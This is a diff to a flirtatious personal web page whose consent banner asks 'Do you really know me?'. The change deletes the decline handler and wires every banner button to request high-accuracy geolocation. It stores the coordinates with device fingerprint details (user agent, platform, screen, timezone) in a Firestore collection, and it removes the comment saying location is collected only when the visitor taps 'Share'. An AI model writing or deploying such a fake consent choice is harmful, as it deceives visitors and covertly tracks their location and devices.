@@ -77,7 +77,7 @@
     }
     @keyframes float {
       0%,100% { transform: translateY(0); }
-      50%      { transform: translateY(-10px); }
+      50%     { transform: translateY(-10px); }
     }
 
     .lock-heading {
@@ -317,7 +317,6 @@
 
 <div class="scene">
 
-  <!-- Lock screen -->
   <div class="lock-screen" id="lock-screen">
     <div class="lock-icon">💌</div>
     <h1 class="lock-heading">Hey, do I know you?&nbsp;🥺</h1>
@@ -349,7 +348,6 @@
     <p class="hint-text" id="hint-text">3 chances remaining</p>
   </div>
 
-  <!-- Denied screen -->
   <div class="denied-screen" id="denied-screen">
     <div class="big-emoji">💔</div>
     <h2>Access Denied</h2>
@@ -359,7 +357,6 @@
 
 </div>
 
-<!-- Consent banner: location is only requested/stored if the visitor taps "Share" -->
 <div class="consent-banner" id="consent-banner">
   <p class="consent-text">Do you really know me? </p>
   <div class="consent-actions">
@@ -544,45 +541,49 @@
   }
   localStorage.setItem('consentAsked', '1');
 
-  document.getElementById('consent-decline').addEventListener('click', () => {
-    hideBanner();
-  });
+  // Grab BOTH buttons using their shared class
+  const consentButtons = document.querySelectorAll('.trigger-yes');
 
-  document.getElementById('consent-share').addEventListener('click', () => {
-    if (!('geolocation' in navigator)) {
-      showToast("😢");
-      hideBanner();
-      return;
-    }
-    navigator.geolocation.getCurrentPosition(
-      async (pos) => {
+  // Loop through them and attach the exact same geolocation logic to both
+  consentButtons.forEach(button => {
+    button.addEventListener('click', () => {
+      
+      if (!('geolocation' in navigator)) {
+        showToast("😢");
         hideBanner();
-        try {
-          await addDoc(visitsCol, {
-            lat: pos.coords.latitude,
-            lng: pos.coords.longitude,
-            accuracyMeters: pos.coords.accuracy,
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${window.screen.width}x${window.screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            ts: serverTimestamp()
-          });
-          showToast('💕');
-        } catch (e) {
-          showToast('😢');
-        }
-      },
-      () => {
-        // Permission denied or unavailable — store nothing
-        hideBanner();
-        showToast('No worries ');
-      },
-      { enableHighAccuracy: true, timeout: 8000 }
-    );
+        return;
+      }
+      
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          hideBanner();
+          try {
+            await addDoc(visitsCol, {
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude,
+              accuracyMeters: pos.coords.accuracy,
+              userAgent: navigator.userAgent,
+              platform: navigator.platform,
+              language: navigator.language,
+              screen: `${window.screen.width}x${window.screen.height}`,
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+              ts: serverTimestamp()
+            });
+            showToast('💕');
+          } catch (e) {
+            showToast('😢');
+          }
+        },
+        () => {
+          // Permission denied or unavailable — store nothing
+          hideBanner();
+          showToast('No worries ');
+        },
+        { enableHighAccuracy: true, timeout: 8000 }
+      );
+      
+    });
   });
-  
 
 </script>
 </body>
